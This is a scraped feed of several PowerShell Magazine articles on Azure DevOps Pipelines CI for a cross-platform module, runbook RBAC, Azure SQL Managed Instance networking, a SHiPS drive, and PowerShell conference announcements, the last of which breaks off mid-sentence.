project to ensure your PowerShell Core module or code works correctly on Windows, Linux and macOS.\nWith the introduction of Azure DevOps Pipelines you can now use the same CI process across Windows, Linux and macOS using the same system. For open source projects this is free, and you can have 10 concurrent CI processes running at the same time. You can keep your existing TravisCI and AppVeyor processes if you’ve got them configured already – there is no restriction to how many different CI processes you can have running on a GitHub open source project.\nIn this article I’ll share my experiences moving one of my open source multi-platform PowerShell Core module projects over to use Azure DevOps Pipelines. This project already had a well-defined CI process set up using PowerShell scripts and Pester, PSScriptAnalyzer, PSake, PSDepend, BuildHelpers, and PSDeploy modules. So, this article won’t be showing how to write PowerShell to create a CI process, as that is a book in itself.\nDisclaimer: Azure DevOps is a rebranding (and more) of an existing cloud-based development tool called Visual Studio Team Services. I’ve been using Visual Studio Team Services build and release pipelines for a couple of years in a private corporate environment, so many of the techniques I implemented such as YAML build definitions weren’t new. However, the experience of getting my GitHub account set up to use Azure DevOps Pipelines was new to me.\nGetting Started To get started using Azure DevOps Pipelines with your open source project you’ve got to hook up your GitHub account to an Azure DevOps organization. The easiest way to do this is to find the Azure Pipelines service page in the GitHub marketplace:\nOnce you’re there, just click Set up a plan and then click Install it for Free. You’ll then be able to review the details of your order.\nNote: If your GitHub account is an owner of a public or private organizational account in then you may also choose the billing account under the Billing information.\nOnce you’re ready, click Complete order and begin installation:\nGitHub then asks which repositories to Install Azure Pipelines into. This will grant Azure Pipelines permissions to perform certain tasks on any repositories you select. I chose to enable Azure Pipelines on just a single repository to start with, but you could select All repositories.\nIt is easy to enable Azure Pipelines into additional GitHub repositories later by heading over to Applications in your GitHub Settings and clicking Configure next to the Azure Pipelines installed GitHub Apps:\nClicking Install takes you over to Azure DevOps where you will be required to login with a Microsoft Account. If you’ve already got an Azure DevOps organization (or a previous VSTS organization) you’ll be asked to select the organization to add the Azure DevOps Pipeline to. But if your Microsoft Account isn’t a member of an Azure DevOps organization then one will be created automatically for you. You can change the name of the Azure DevOps organization later if the default name doesn’t suit you.\nIf a new Azure DevOps organization was created for you then a new project will be created in the Azure DevOps organization with the same name. This isn’t too obvious at first.\nBut if you chose (or had an option to choose) to use an existing Azure DevOps organization (e.g. if you had a previous VSTS organization attached to your Microsoft account) then you’ll be asked to select an existing project or create a new one. The flow is slightly different, but still very straightforward.\nWhether or not you had a project and organization created for you or used existing ones you’ll be taken straight to the New Pipeline screen:\nThis is a new experience that was not present in the old VSTS. The list of repositories that have been granted access to Azure DevOps Pipelines will be listed. Clicking the repository to create a pipeline for will display the Template step.\nThe Template step is where you can select from a list of CI build templates for common project types. Unfortunately, a template for PowerShell modules or projects is not provided, but this is fine because we don’t need anything fancy if using the PowerShell PSake module to include all the build code in a psakefile.ps1 in the GitHub repository (which I had done).\nI just selected Starter pipeline:\nA YAML file is displayed that describes the steps that will be performed each time the CI process runs. This file, named azure-pipelines.yml, will be committed into the root folder of the GitHub repository for us.\nWhat we would typically do is customize the YAML file to define jobs, steps, tasks and other configuration items that are used to drive our CI process. We can customize this file directly in this editor or do it later by changing it in the repository.\nFor the CI Process to build and test my Cosmos DB PowerShell module I used the following:\njobs: - job: Build_PS_Win2016 pool: vmImage: vs2017-win2016 steps: - powershell: | .\\build.ps1 -Verbose displayName: \u0026#39;Build and Test\u0026#39; - task: PublishTestResults@2 inputs: testRunner: \u0026#39;NUnit\u0026#39; testResultsFiles: \u0026#39;**/TestResults.xml\u0026#39; testRunTitle: \u0026#39;PS_Win2016\u0026#39; displayName: \u0026#39;Publish Test Results\u0026#39; - job: Build_PSCore_Ubuntu1604 pool: vmImage: ubuntu-16.04 steps: - script: | curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - curl https://packages.microsoft.com/config/ubuntu/16.04/prod.list | sudo tee /etc/apt/sources.list.d/microsoft.list sudo apt-get update sudo apt-get install -y powershell displayName: \u0026#39;Install PowerShell Core\u0026#39; - script: | pwsh -c \u0026#39;.\\build.ps1\u0026#39; displayName: \u0026#39;Build and Test\u0026#39; - task: PublishTestResults@2 inputs: testRunner: \u0026#39;NUnit\u0026#39; testResultsFiles: \u0026#39;**/TestResults.xml\u0026#39; testRunTitle: \u0026#39;PSCore_Ubuntu1604\u0026#39; displayName: \u0026#39;Publish Test Results\u0026#39; - job: Build_PSCore_MacOS1013 pool: vmImage: xcode9-macos10.13 steps: - script: | brew update brew tap caskroom/cask brew cask install powershell displayName: \u0026#39;Install PowerShell Core\u0026#39; - script: | pwsh -c \u0026#39;.\\build.ps1\u0026#39; displayName: \u0026#39;Build and Test\u0026#39; - task: PublishTestResults@2 inputs: testRunner: \u0026#39;NUnit\u0026#39; testResultsFiles: \u0026#39;**/TestResults.xml\u0026#39; testRunTitle: \u0026#39;PSCore_MacOS1013\u0026#39; displayName: \u0026#39;Publish Test Results\u0026#39; I’ll cover the content of this file further down. But for now, click Save and Run.\nThis gives you the option of committing directly to dev branch (or whatever the default branch of your repository is set to) or creating a new branch for this commit and start a pull request:\nWhat you choose to do will depend on if the GitHub repository allows contributors or owners to commit directly to the default branch or if changes must be made by way of a Pull Request. I used a Pull Request as this allowed me to get the CI process working before making changes to my default branch.\nClicking Save and run again will commit the file and create the new Azure Pipeline. It will also manually trigger a build using the Azure Pipeline and the YAML file that was created.\nNote: Although this happens automatically, this is still considered a manual trigger, because this wasn’t triggered by a commit to the GitHub repository.\nIf your CI process was successful with no errors (no PowerShell errors or test failures) then you can merge your Pull Request in GitHub:\nThe setup of the CI process in Azure Pipelines is now completed. It was pretty easy, and I managed to get the basics working in around 30 minutes.\nTriggers By default, when you create an Azure DevOps Pipeline it is configured to be triggered when any commits are made to the default branch (usually dev) and for any Pull Requests made to the default branch. In my case I prefer my CI process to be triggered on changes to any branch. So, I needed to edit the Triggers section in the Build definition by editing it in the Azure DevOps interface:\nOnce in the Build definition on the Triggers tab I changed the Continuous Integration trigger to contain a Branch Filter to include *****:\nThe Save \u0026amp; Queue (or just Save) the updated Build definition.\nNote: This can also be done by adding a Triggers entry to the YAML definition in the source code repository (see this page for more information).\nBuild Badges A useful feature of most CI tools is that they allow you to easily display the status of your CI process pipelines in a README.MD or other documentation in your repository:\nAzure DevOps Pipelines is no exception. To get the example markdown to display the badge:\nI copied the Sample Markdown and pasted it into the README.MD in my project. This also makes it simple for anyone to click the badge and jump over to the project.\nMaking it Public If you had allowed the GitHub marketplace item for Azure DevOps Pipeline create your Azure DevOps organization and project, then it will have created the organization as allowing Public projects and made this project Public:\nThis does not mean anyone can edit the project or create/edit builds, but it does mean that anything that happens gets logged in the CI process during the build will be visible to everyone.\nNote: Azure DevOps Pipelines will try to protect sensitive build variables by masking them, but we’ll cover that shortly.\nHowever, when I set up my first project I was using an existing organization, which was configured to prevent Public projects. This meant that my project was configured as Private visibility only. This wasn’t ideal because all contributors and end consumers of an open source project need to be able to view the CI process logs and test results. I had to go into my Organization settings and set the Allow public projects Security Policy to On:\nMy azure-pipelines.yml File The most challenging part of setting up an Azure DevOps Pipeline is configuring the azure-pipelines.yml file, but it becomes quite clear how this works without too much research. All other continuous integration tools I’ve used require or at least support a YAML or some other declarative syntax file to be provided within the repository to control the CI process, so this isn’t unusual. This is often referred to Pipeline as Code.\nNote: With Azure DevOps Pipelines, you can also use a visual designer to define a build pipeline and then export the YAML file or just keep the visually designed pipeline and use that. I’d recommend exporting the YAML file and putting it in your repository because then the CI process definition itself is under source control.\nJobs In my case I created a file that defined a simple CI process that contained three jobs:\n Build and test the module on an agent running Windows Server 2016 using PowerShell.  - job: Build_PS_Win2016 pool: vmImage: vs2017-win2016 Build and test the module on an agent running Ubuntu 16.04 using PowerShell Core.  - job: Build_PSCore_Ubuntu1604 pool: vmImage: ubuntu-16.04 Build and test the module on an agent running MacOS 10.13 using PowerShell Core.  - job: Build_PSCore_MacOS1013 pool: vmImage: xcode9-macos10.13 The jobs run in series each time the build triggers and runs on an agent in an Agent Pool using the vmImage specified. The available Agent Pools and the exact software installed onto them can be found in the Project Settings:\nSteps \u0026amp; Tasks Each job contained a single step with two or three tasks:\nFor the Build_PS_Win2016 job, I just had two tasks:\n Run the PowerShell script ps1 in the repository (with -Verbose output enabled). The build.ps1 just runs the tests (using Pester), build the PowerShell help (using PlatyPS) and prepares the module for publishing. It does this by using PSake to run tasks defined in the psakefile.ps1:  - powershell: | .\\build.ps1 -Verbose displayName: \u0026#39;Build and Test\u0026#39;  Publish the result of the Pester tests to back to the build so that they are available in the report:  - task: PublishTestResults@2 inputs: testRunner: \u0026#39;NUnit\u0026#39; testResultsFiles: \u0026#39;**/TestResults.xml\u0026#39; testRunTitle: \u0026#39;PS_Win2016\u0026#39; displayName: \u0026#39;Publish Test Results\u0026#39; For the Build_PSCore_Ubuntu1604 job, I needed to perform similar tasks as the Windows one, but I also needed to add an additional task:\n Install PowerShell Core:  - script: | curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - curl https://packages.microsoft.com/config/ubuntu/16.04/prod.list | sudo tee /etc/apt/sources.list.d/microsoft.list sudo apt-get update sudo apt-get install -y powershell  Run the PowerShell script ps1 in the repository (with -Verbose output enabled). The build.ps1 just runs the tests (using Pester), build the PowerShell help (using Platyps) and prepares the module for publishing. It does this by using PSake to run tasks defined in the psakefile.ps1:  - script: | pwsh -c \u0026#39;.\\build.ps1\u0026#39; displayName: \u0026#39;Build and Test\u0026#39; Note: This is slightly different to the Windows task as I can’t use the PowerShell task type, I instead use the script task type, executing pwsh (PowerShell Core) and passing in the name of the script to run\n Publish the result of the Pester tests to back to the build so that they are available in the report:  - task: PublishTestResults@2 inputs: testRunner: \u0026#39;NUnit\u0026#39; testResultsFiles: \u0026#39;**/TestResults.xml\u0026#39; testRunTitle: \u0026#39;PSCore_Ubuntu1604\u0026#39; displayName: \u0026#39;Publish Test Results\u0026#39; Note: the testRunTitle attribute allows the tests to be grouped by the different agents. If this is omitted, all the tests for each agent get bundled together which makes it nearly impossible to tell which agent the tests failed on.\n_ _Finally, for the Build_PSCore_MacOS1013 job, I needed to perform similar tasks as the Windows one, but I also needed to add an additional task:\n Install PowerShell Core:  - script: | brew update brew tap caskroom/cask brew cask install powershell displayName: \u0026#39;Install PowerShell Core\u0026#39;  Run the PowerShell script ps1 in the repository (with -Verbose output enabled). The build.ps1 just runs the tests (using Pester), build the PowerShell help (using Platyps) and prepares the module for publishing. It does this by using PSake to run tasks defined in the psakefile.ps1:  - script: | pwsh -c \u0026#39;.\\build.ps1\u0026#39; displayName: \u0026#39;Build and Test\u0026#39;  Note: This is slightly different to the Windows task as I can’t use the PowerShell task type, I instead use the script task type, executing pwsh (PowerShell Core) and passing in the name of the script to run.\n Publish the result of the Pester tests to back to the build so that they are available in the report:\n- task: PublishTestResults@2 inputs: testRunner: \u0026#39;NUnit\u0026#39; testResultsFiles: \u0026#39;**/TestResults.xml\u0026#39; testRunTitle: \u0026#39;PSCore_MacOS1013\u0026#39; displayName: \u0026#39;Publish Test Results\u0026#39;  Note: the testRunTitle attribute allows the tests to be grouped by the different agents. If this is omitted, all the tests for each agent get bundled together which makes it nearly impossible to tell which agent the tests failed on.\n As you can see, there is not too much functionality in the YAML file itself. The real work is done by the build.ps1 and the psakefile.ps1. Both of these scripts work the same way no matter whether I’m using AppVeyor, Travis CI or Azure DevOps Pipelines, and I use pretty much the same code in all of them.\nPipeline Variables and Secrets The final thing I needed to do to complete my Azure DevOps Pipeline, was to add environment variables containing the Azure service principal details allowing my Pester tests to connect to my Azure account to create a real Cosmos DB to test against. These environment variables are sensitive (they grant access to my Azure account) and so must be treated with care and never committed into a source code repository.\nThe normal way of sharing sensitive information with the agent is to define pipeline variables:\nAny variable that is not a secret variable will be available to the agent as an environment variable. However, pipeline variables that are defined as secret will not be available as an environment variable. They are exposed in other ways, see this page for more details.\n Note: This is different behaviour than in AppVeyor or Travis CI which expose both secret and non-secret variables as environment variables. In my case I will need to adjust my build.ps1 script to take account of this.\n Some other important notes about pipeline variables:\n Usually only the owner of the build definition can edit or see these build variables. Other public users can not view or edit the build definition, so they cannot see the pipeline variables Pipeline variables are not made available to builds triggered by a pull request because this would make them accessible to anyone who submitted the pull request to your repository. This behaviour can be changed, but it would compromise any variables declared in the build definition. Pipeline variables can be defined within the azure-pipelines.yml file as well, however, this would result in the values being committed into your source code repository which would compromise the values.  Next Steps There are still several tasks I have yet to complete before I’m completely satisfied that my Azure DevOps Pipelines CI (and continuous delivery) process is 100% finished:\n Change the integration test process to be able to access the pipeline variables that are declared as secret. This will enable the integration tests in my Cosmos DB module to use my personal Azure account to create a Cosmos DB account and run tests against it. Output my module and related files (documentation etc.) as a build artefact. This makes them part of the build output and available for download if the build still exists. My AppVeyor CI Process currently does this, and I just need to add the additional tasks to the azure-pipelines.yml Move the process of publishing the module to the PowerShell Gallery from my AppVeyor CI process into Azure DevOps Pipelines as a Release Pipeline. The Release Pipeline will be triggered from a Build Pipeline producing an artefact from the master   Note: Release Pipelines are often linked to a Continuous Delivery process. If there is interest, I will share a guide on how I set this up. However, at the time of writing this article, Release Pipelines in Azure DevOps cannot be controlled from a YAML file, so the more traditional visual designer method of defining a Release Pipeline is required.\n Summary I found the experience of enabling Azure DevOps Pipelines seamless and well thought-out. It provides several great features that aren’t as full featured in other free CI tools, such as:\n The Test Summary and test filters are also very useful when tracking down a failed test:  If you’re looking into implementing a CI process for an open source project, then Azure DevOps Pipelines worth a look. Or if you’re just wanting to add another layer of validation to a project with an existing CI process then this should be a fun an easy implementation.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/09/20/converting-a-powershell-project-to-use-azure-devops-pipelines/","tags":["Azure DevOps","DevOps","Azure"],"title":"Converting a PowerShell Project to use Azure DevOps Pipelines"},{"categories":["Azure"],"contents":"When setting up runbooks in Azure Automation to invoke automation of a process through PowerShell or Python runbooks, the ability to assign permissions per runbook for user types such as power users is something we missed in the early days of Azure Automation.\nWhen working with permissions in Azure, we have the concept of RBAC available:\nRole-based access control (RBAC) enables access management for Azure resources. Using RBAC, you can segregate duties within your team and grant only the amount of access to users, groups, and applications that they need to perform their jobs.\nDuring the past year, the ability to configure RBAC for runbooks was added to the service.\nWhen I initially tested this feature, I granted 1 single test user permissions to an existing user.\nConnect-AzureRmAccount Connect-AzureAD #Resource Group name for the Automation Account $rgName = \u0026#34;AutomationWestEurope-Rg\u0026#34; #Name of the Automation Account $automationAccountName =\u0026#34;AutomationWestEurope\u0026#34; #Name of the runbook $rbName = \u0026#34;Invoke-RobocopyBackup\u0026#34; $userId = (Get-AzureADUser -ObjectId \u0026#39;demo.user@powershell.no\u0026#39;).ObjectId #Gets the Automation Account resource $aa = Get-AzureRmResource -ResourceGroupName $rgName -ResourceType \u0026#34;Microsoft.Automation/automationAccounts\u0026#34; -ResourceName $automationAccountName #Get the runbook resource $rb = Get-AzureRmResource -ResourceGroupName $rgName -ResourceType \u0026#34;Microsoft.Automation/automationAccounts/runbooks\u0026#34; -ResourceName \u0026#34;$automationAccountName/$rbName\u0026#34; #The Automation Job Operator role only needs to be run once per user New-AzureRmRoleAssignment -ObjectId $userId -RoleDefinitionName \u0026#34;Automation Job Operator\u0026#34; -Scope $aa.ResourceId #Adds the user to the Automation Runbook Operator role to the runbook scope New-AzureRmRoleAssignment -ObjectId $userId -RoleDefinitionName \u0026#34;Automation Runbook Operator\u0026#34; -Scope $rb.ResourceId I then logged into the Azure subscription using that user. As expected, the only resource the user has access to is the single runbook where permissions are assigned:\nThis means the user is unable to see the whole Automation account, including resources such as global variables, credentials and other shared resources.\nAfter starting a runbook job, everything looked like expected, except for the Output stream being unavailable (“No access”):\nAfter reaching out to the Automation team, I got in touch with Chris Sanders which determined that the Microsoft.Automation/automationAccounts/jobs/output/read permission seemed to be missing.\nI was recently asked to test again, since the bug is now fixed.\nThis time, the required permissions was in place and the Output stream was visible:\nThe ability to assign runbook permissions for users and groups is a very useful feature, making it possible to use the Azure Portal as the user interface for an automated process. It is then possible to perform tasks without granting the end user permissions directly to backend services such as a SQL database or local administrator permissions on a server.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/08/27/configuring-role-based-access-control-rbac-for-runbooks-in-azure-automation/","tags":["Azure Automation","Azure"],"title":"Configuring role-based access control (RBAC) for runbooks in Azure Automation"},{"categories":["PSConfAsia","PSConf"],"contents":"The PowerShell Conference Asia resumes for its 4th year this October, bringing speakers from Asia and around the world to deliver in-depth PowerShell and DevOps sessions. I am excited to be a part of this great event for another year and can’t wait to meet all my old friends and make a few new friends. I will be bringing over a few copies of my Pro PowerShell Desired State Configuration book to give away!\nJeffrey Snover, father of PowerShell, will be at this year’s conference and other speakers include the Microsoft PowerShell Product Team members from Redmond and a strong line-up of MVPs, well-known international speakers, and community contributors. They’ll cover in-depth topics on the PowerShell language and how you can use PowerShell to automate the technologies you use every day, both within the Microsoft technology stack and well beyond. There will be strong focus on using PowerShell to enable DevOps practices whether on-premises or in the cloud as well as Systems Administration and Security.\nOur theme for this year will emphasize on the Open Source aspects of PowerShell development as we look to build an even stronger community engagement and contribution. The main event runs on Friday and Saturday, but we also have a pre-conference day on Thursday for hands-on workshops. At the end of Day 1 (Friday), we have drinks and nibbles at a local bar where you can connect with peers and the speakers in a more relaxed setting. All included in your ticket price. Remember, we still have another full day of content on Saturday though!\nSimilar to my PowerShell Conference EU 2018 PS Drive, I made one for browsing PS Conference Asia agenda as well. You can download the module from my GitHub repository https://github.com/rchaganti/psconfasiadrive.\nHere is a quick snip of using this module.\nIf you are in the APJ / APAC region and you have not registered yet to attend this conference, this is the right time to do so. You can use this special link for PowerShell Magazine readers to avail discount on the conference pass.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/08/14/powershell-conference-asia-2018-psconfasia/","tags":["Conferences"],"title":"#PowerShell Conference Asia 2018 #PSConfAsia"},{"categories":["Azure","Azure SQL"],"contents":"Azure SQL Database Managed Instance (preview) is a new database service in Azure. This is a fully-managed latest version of SQL Server database engine hosted in Azure and managed by Azure and SQL Server teams.\nAzure SQL Managed Instance is your private database engine PaaS resource that is placed in your Azure VNet with assigned private IP from the range that you can choose. You need to pre-configure Azure environment where Managed Instance will be placed before creation of new managed instances.\nAlthough you can create and configure all necessary VNets, subnets, and network access rules using the Azure portal, this could be error-prone task because you need to follow the rules described here. The better approach would be to create PowerShell script that creates and configures your Azure environment where you will place your Managed Instances. In the following sections, you will see one example of the PowerShell code that configures the environment for the Azure SQL Database Managed Instance.\nConfiguring environment In order to provision SQL Database Managed Instances, you would need to do the following three important things:\n Create VNet where your Managed Instances will be injected. Create a dedicated subnet in your VNet where Managed Instances should be placed. Set user-defined route table that would enable communication between your Managed Instances in private subnet and Azure management service.  In the following sections we describe how to configure these elements using PowerShell. The assumption is that you already have Azure subscription and that you can connect to your Azure account using PowerShell.\nConfiguring virtual network In the first step, you need to create a VNet where your Managed Instances will be placed. In our example, VNet will use IP range 10.0.0.0/16 – you can change this according to your needs.\nWe also create the default subnet with a range 10.0.0.0/24 where you could place some of the resources that could communicate to Managed Instances (for example, VMs that you would use to install apps that will access managed instance). Note that other resources cannot be placed in the subnet that is dedicated to Managed Instances. If you don’t need other resources in the VNet, you can use this subnet to place Managed Instances.\nThe following commands create new resource group called myPowerShellMagazineResourceGroup and VNet called myPowerShellMagazineNetwork in West Central US region:\n$resourceGroup = \u0026#39;myPowerShellMagazineResourceGroup\u0026#39; $location = \u0026#39;West Central US\u0026#39; $vNetName = \u0026#39;myPowerShellMagazineNetwork\u0026#39; New-AzureRmResourceGroup -ResourceGroupName $resourceGroup -Location $location $virtualNetwork = New-AzureRmVirtualNetwork -ResourceGroupName $resourceGroup -Location $location -Name $vNetName -AddressPrefix 10.0.0.0/16 $subnetConfig = Add-AzureRmVirtualNetworkSubnetConfig -Name default -AddressPrefix 10.0.0.0/24 -VirtualNetwork $virtualNetwork Now, the first step is done and you need to create one or more additional subnets that would be dedicated to your Managed Instances.\nConfiguring subnet for Managed Instance Every Managed Instance is placed in a subnet that defines the boundary of IP addresses that every instance can take. Managed Instances don’t have fixed IP addresses. Azure service that controls and manages instances can move an instance to a different IP addresses if OS or database engine code is patched/upgraded, some problem is detected and the instance needs to be moved to the new location, or if you want to assign more resources to the instance so it needs to be re-allocated to a machine with more resources.\nManaged Instances will assume that they can take any place/IP address within the IP range of the subnet, so if you accidentally put some VM or other resource in this subnet it will clash with some Managed Instance. You would need to plan carefully how big is IP range that you would assign to this subnet because it cannot be changed once you create first resource in the subnet. IP range depends on the number of instances that you want to place in subnet and you would need at least two IP addresses per each instance and 4 IP addresses reserved for internal services (this might be changed in the future).\nThe subnet is dedicated to SQL Database Managed Instances. This subnet cannot contain any other resource such as VMs that could take some IP address in the subnet.\nLet’s create a new subnet called “mi” with the IP address range 10.0.1.0/24 (this could be changed according to your needs):\n$subnetConfigMi = Add-AzureRmVirtualNetworkSubnetConfig -Name mi -AddressPrefix 10.0.1.0/24 -VirtualNetwork $virtualNetwork $virtualNetwork | Set-AzureRmVirtualNetwork If you need more subnets where you want to group and organize your instances, you can repeat this code with different -Name and -AddressPrefix values.\nEnable access to Azure Management Service The final step is to configure access that would enable the managed instances in the private IP range to communicate with the Azure services that manages them.\nManaged Instance subnet must have access to Azure services that gets the heartbeat signals from the Managed Instances that are placed in your subnet. These signals enable the service to check instance health and manage the instance (for example, perform regular backups, failover instance if something is wrong, etc.).\nYou need to create one route table that will have address prefix 0.0.0.0/0 and next hop set to “Internet” to enable this communication, as shown in the following script:\n$routeTableMiManagementService = New-AzureRmRouteTable -Name \u0026#39;myRouteTableMiManagementService\u0026#39; -ResourceGroupName $resourceGroup -location $location Set-AzureRmVirtualNetworkSubnetConfig -VirtualNetwork $virtualNetwork -Name \u0026#39;mi\u0026#39; -AddressPrefix 10.0.1.0/24 -RouteTable $routeTableMiManagementService | Set-AzureRmVirtualNetwork Get-AzureRmRouteTable -ResourceGroupName $resourceGroup -Name \u0026#39;myRouteTableMiManagementService\u0026#39; | Add-AzureRmRouteConfig -Name \u0026#39;ToManagedInstanceManagementService\u0026#39; -AddressPrefix 0.0.0.0/0 -NextHopType \u0026#39;Internet\u0026#39; | Set-AzureRmRouteTable  NOTE: User route table with described configuration is the current requirement during the public preview period. This requirement will change in future and enable you to specify narrow set of IP ranges for the traffic that goes outside the subnet. Always check the Managed Instance documentation to see the latest security rules.\n Conclusion Once you finish with the steps described in this article, you will have prepared environment where you can create Azure SQL Database Managed Instances.\nYou can create Managed instances using Azure portal, ARM templates, Azure PowerShell, and Azure CLI. When you use some of these methods, you would need to provide resource group, VNet, and subnet for your managed instances.\nProbably is the best to do it first in the Azure portal because you can visually see how to configure the instance, and then you can automate it using Azure PowerShell and following the steps from this article.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/07/23/configuring-azure-environment-to-set-up-azure-sql-database-managed-instance-preview/","tags":["Azure","Azure SQL"],"title":"Configuring Azure environment to set up Azure SQL Database Managed Instance (preview)"},{"categories":["PSConfEU","PSConf","SHiPS","Module Spotlight"],"contents":"The SHiPS module has several use cases with structured data. I have written a few proof-of-concept modules using SHiPS to understand how it works and try out different design patterns.\nOne of my sessions at PowerShell Conference EU 2018 is around using SHiPS. In the process of creating different demos for this session, I started implementing PS drives for several different things. One such module I created enables the ability to browse PowerShell Conference EU 2018 agenda as a PowerShell drive. I have an initial draft of this module at https://github.com/rchaganti/PSConfDrive.\nHow to install the module? Since this is still a very early version of the module, I have not published it yet on the PowerShell Gallery and you need to download the zip archive of the GitHub repository and extract it to a folder represented by $env:PSModulePath. You will require the SHiPS module as well. This can be downloaded from the PowerShell Gallery.\nInstall-Module -Name SHiPS -Force The following commands will load the modules and map a PS drive.\nImport-Module SHiPS -Force Import-Module PSConfDrive -Force New-PSDrive -Name PSConfEU -PSProvider SHiPS -Root psconfdrive#psconfeu Here is how you can use this PS drive for exploring the conference agenda.\nOnce again, this is a POC only and the design still needs to be and can be optimized. If you plan to attend PSConfEU 2018, come to my session on SHiPS to understand how to use the module and choose the right design pattern for your modules.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/04/03/psconfeu-agenda-as-a-powershell-drive-using-ships/","tags":["Conferences","Modules","SHiPS"],"title":"#PSConfEU Agenda as a PowerShell Drive using #SHiPS"},{"categories":["PSConf","PSConfEU"],"contents":"The US-based “PowerShell and DevOps Global Summit” sold out in record time this year, and the European “PowerShell Conference EU” (psconf.eu) is filling quickly. Both take place in April 2018. If they are new to you, then it’s probably because they are community-organized events, without a profit intention and with no huge marketing budget. That being said there is work being done to try to expand said marketing budget in the near future. One of the ways we are trying to give ourselves a larger online marketing presence is by hiring a wikipedia page consultant. This person will be in charge of giving us a professionally formatted wikipedia presence that our potential clients can peruse to learn about our business. Expanding the marketing budget is important of course, but in the meantime there are alternatives that we as a business can use that are still well within our budget. We should turn to those first to be sure.\nAs a co-organizer of psconf.eu, I’d like to walk you through this year’s event and some of its ideas. Here is the official AfterMovie from PSConfEU 2017.\n  Psconf.eu takes place this year April 17-20, in Hanover, Germany. The full agenda and last-minute information are available at www.psconf.eu.\nThere is no doubt that PowerShell is an essential skill set for modern administrators, and it has always evolved. When you look at the PowerShell ecosystem in the past 12 months, though, you’ll see an unprecedented pile of changes, some of which are transformative and even disruptive.\nPowerShell went open-source, PowerShell Core 6 goes cross-platform and reaches out to Linux and macOS, admins are faced with two PowerShell “editions”, and Windows PowerShell is frozen. It’s an exciting mix of opportunities (reaching out to Linux/macOS, managing heterogenous environments, using PowerShell in the cloud) and deep desire for guidance (will I have to rewrite scripts with PowerShell Core 6? How can I develop code that works in all PowerShell editions? How safe is it to continue to rely on Windows PowerShell 5?).\nProblem is: you can’t attend classes or get books for answers to any of these questions. Once there are classes or books, they would inevitably be outdated again. Classes and books are great for fundamentals, but too static to cope with cutting edge topics, and Microsoft has been pretty cutting edge lately.\nAs an admin in a small shop, you may get away with ignoring the latest developments for a while. As a consultant or admin in larger enterprises, you cannot. First-hand \u0026amp; cutting-edge information is what your future decisions are based on. It drives your business. Guaranteeing state of the art and safe operations is a must.\nThat’s why PowerShell conferences are partially serving the training for hot topics these days and feel more like an intense advanced training for experienced PowerShell professionals. Instead of asking for permission to go to a conference, it would probably be more accurate to tap your training budget.\nShould you feel you can’t get out of your job for 4 days, consider this: by bringing together experts from all disciplines to one location, and embedding them into a well-designed and rich agenda, surrounded by social and workshop events, these conferences provide the answers, guidance and orientation that save you endless hours of internet research, make sure you won’t reinvent the wheel, focus on future-proof techniques, and use the latest security guidelines.\nGetting Orientation and Guidance On day 1, we open the conference with delegate registration and then start together in the great historic Leibniz Saal. PowerShell inventor Jeffrey Snover kicks off the event with his keynote “PowerShell 2018 – State of the Art”, providing solid orientation and guidance: where do we stand, where do we go from here. Then, the conference fans out into three parallel tracks, most of which are delivered in English.\nSome of these presentations dig deeper into PowerShell Core: Wojciech Sciesinski explains how to create future-proof PowerShell modules that are compatible with all PowerShell editions, and work cross-platform. PowerShell team members from Redmond showcase their current developments, Ben Gelens talks about new DSC, and German .NET Guru Dr. Schwichtenberg explains what to do with PowerShell on Linux, and summarizes the essential .NET knowledge any ambitioned PowerShell user should have.\nNo-Nonsense Sessions \u0026amp; Discussions If you ever attended a classic conference, you know how exhausting it can be to listen to endless presentations and slide decks. At psconf.eu, all presentations are 45 minutes sharp, then open up in discussion. We want presentations to be concise and on the point, and prefer demos over endless slides. At the end, you have 15 minutes of Q\u0026amp;A. “Presentations are great, but coffee breaks are where you meet people” This is why psconf.eu has the highest coffee break ratio in the industry: Chat with the presenters, let the information further sink in, defrag your mind, and connect to others.\nAll materials will be downloadable, and sessions are recorded so you can replay them later. “Ask the Speakers” on day 1, “Ask the Experts” at every lunch, and the speakers and Microsoft finale at the end are all chances to get information for anything that wasn’t covered in the presentations. If you leave the event with a PowerShell question unanswered, then you did not ask.\nSocial Event This is a personal conference where you get to know people, and know whom to ask. That’s why there is a limit on the number of delegates, and why we have social evenings. The legendary evening event on day 1 takes place in “Yukon Bay” again, an ancient gold digger town in the heart of the Hanover Zoo. It will be a big “Hello” for the alumnis, and a warm “Welcome” to anyone new to psconf.eu. We’ll have great food and drinks, polar bears and seals, beer and wine, and the chance to hang loose and make new connections and friendships. Everyone hangs out, including speakers. You may want to continue to talk about PowerShell, but you may just as well just kick back and enjoy the evening, the likelihood of which raises over time and number of beers.\nSecurity – Essential Knowledge to Boost Your Career psconf.eu delivers 75 sessions and covers almost every aspect of PowerShell. It wouldn’t make sense to go over all sessions here. Visit www.psconf.eu instead and review the full agenda. Tip: hover over a session to view the abstract. The agenda is preliminary, and we hope to be able to implement a mobile-friendly version soon.\nOne topic stands out: Security. We want delegates to become security experts and really know the best practices and how to deal with unsafe code and attackers. “Investing in people” is the best protection you can get, and psconf.eu is the place where you can do this investment, and improve security awareness and skills:\nSecurity expert Matt Graeber reviews “the current state of PowerShell Security Features and Bypasses”. This includes JEA (“Just Enough Admin”), and when used correctly, it can be tremendously effective to increase security by reducing the blast radius of a compromise. Jan-Hendrik Peters and Raimund Andree from Microsoft Germany show you how: “Hands-on JEA”, complimented by David das Neves and Julien’s two-slot “The PowerShell Security Best Practice Live Demo”.\nThat’s literally just the tip of the iceberg. Red Teams and nation state threat actors alike are using PowerShell obfuscation to evade detection. Come see how the author of Invoke-Obfuscation and one of the original PowerShell developers tackle detecting obfuscation with PowerShell’s Abstract Syntax Tree and science in Revoke-Obfuscation (“Revoke-Obfuscation: PowerShell Obfuscation Detection (And Evasion) Using Science”). Attackers constantly update their tradecraft, forcing defenders to quickly build, tune, deploy \u0026amp; maintain detections in never-ending sprints. Check out how applying DevOps practices \u0026amp; frameworks like Pester, ScriptAnalyzer, \u0026amp; custom fuzzers can 